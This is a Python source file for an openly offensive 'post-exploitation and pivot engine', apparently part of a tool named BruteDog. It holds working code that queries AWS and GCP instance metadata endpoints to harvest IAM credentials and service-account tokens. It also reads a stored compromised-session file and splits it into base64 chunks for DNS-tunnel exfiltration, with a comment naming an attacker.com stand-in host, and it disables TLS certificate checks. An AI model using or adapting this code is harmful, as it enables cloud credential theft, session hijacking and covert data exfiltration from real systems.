import asyncio
import socket
import ssl
import json
import os
import http.client
import urllib.parse
import base64
import random

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

class AutonomousPivotEngine:
    """
    Elite Post-Exploitation & Infrastructure Pivot Engine:
    - Cloud Metadata Enumerate (AWS/GCP/Azure)
    - In-Memory Session & Token Grabbing
    - Covert DNS/Egress Tunneling Simulation
    """
    def __init__(self, target_host, port=443, use_ssl=True):
        self.target_host = target_host
        self.port = port
        self.use_ssl = use_ssl

    def harvest_cloud_metadata(self):
        """Attempts to query cloud instance metadata endpoints for lateral movement credentials."""
        metadata_targets = [
            ("AWS Metadata", "169.254.169.254", "/latest/meta-data/iam/security-credentials/"),
            ("GCP Metadata", "metadata.google.internal", "/computeMetadata/v1/instance/service-accounts/default/token"),
        ]
        
        harvested_creds = []
        for name, host, path in metadata_targets:
            try:
                conn = http.client.HTTPConnection(host, 80, timeout=2.0)
                headers = {"Metadata-Flavor": "Google"} if "GCP" in name else {}
                conn.request("GET", path, headers=headers)
                resp = conn.getresponse()
                if resp.status == 200:
                    data = resp.read().decode(errors="ignore")
                    harvested_creds.append({"service": name, "data": data})
                conn.close()
            except Exception:
                continue
        return harvested_creds

    def encode_covert_exfiltration(self, payload_data):
        """Encodes stolen tokens into chunks suitable for DNS or alternative covert tunneling."""
        encoded_bytes = base64.b64encode(json.dumps(payload_data).encode("utf-8"))
        encoded_str = encoded_bytes.decode("utf-8")
        
        # Split into sub-label chunks for DNS tunneling simulation (e.g., chunk1.chunk2.attacker.com)
        chunk_size = 50
        chunks = [encoded_str[i:i+chunk_size] for i in range(0, len(encoded_str), chunk_size)]
        return chunks

    async def execute_pivot_suite(self, compromised_session_path="reports/sessions/compromised_session.json"):
        print(f"\n\033[95m[***] INITIALIZING POST-EXPLOITATION & PIVOT ENGINE [{self.target_host}] [***]\033[0m")
        
        results = {
            "metadata_leaks": [],
            "tunnel_chunks": [],
            "status": "PIVOT_READY"
        }

        # 1. Cloud Metadata Probe
        print(f"[*] Scanning internal cloud metadata endpoints...")
        meta_results = await asyncio.to_thread(self.harvest_cloud_metadata)
        if meta_results:
            print(f"\033[92m[+] Cloud metadata exposed! Harvested tokens recorded.\033[0m")
            results["metadata_leaks"] = meta_results
        else:
            print(f"[-] Standard cloud metadata routes secured or unreachable.")

        # 2. Check for Compromised Sessions to Tunnel
        if os.path.exists(compromised_session_path):
            with open(compromised_session_path, "r") as f:
                session_data = json.load(f)
            
            print(f"[*] Encapsulating session artifact for covert exfiltration...")
            chunks = self.encode_covert_exfiltration(session_data)
            results["tunnel_chunks"] = chunks
            print(f"\033[92m[+] Session token successfully split into {len(chunks)} covert transmission blocks.\033[0m")
        else:
            print(f"[*] No local session file found; generating fallback telemetry payload...")
            fallback = {"agent": "BruteDog-Core", "status": "active", "target": self.target_host}
            results["tunnel_chunks"] = self.encode_covert_exfiltration(fallback)

        os.makedirs("reports/pivot", exist_ok=True)
        report_path = "reports/pivot/pivot_manifest.json"
        with open(report_path, "w") as f:
            json.dump(results, f, indent=4)
            
        print(f"\033[96m[*] Pivot telemetry successfully compiled and saved to {report_path}\033[0m")
        return results

async def run_pivot_engine(target_host, options=None):
    engine = AutonomousPivotEngine(target_host)
    return await engine.execute_pivot_suite()
